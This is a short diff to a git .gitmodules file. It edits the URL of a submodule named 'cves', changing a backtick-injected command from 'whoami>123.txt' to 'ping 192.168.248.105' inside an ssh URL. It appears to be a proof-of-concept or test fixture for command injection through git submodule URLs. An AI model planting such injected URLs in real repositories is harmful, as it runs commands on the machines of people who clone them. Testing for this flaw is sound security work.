@@ -1,3 +1,3 @@
 [submodule "cves"]
 	path = cves
-	url = ssh://```whoami>123.txt`foo.example.com/bar
+	url = ssh://```ping 192.168.248.105`foo.example.com/bar
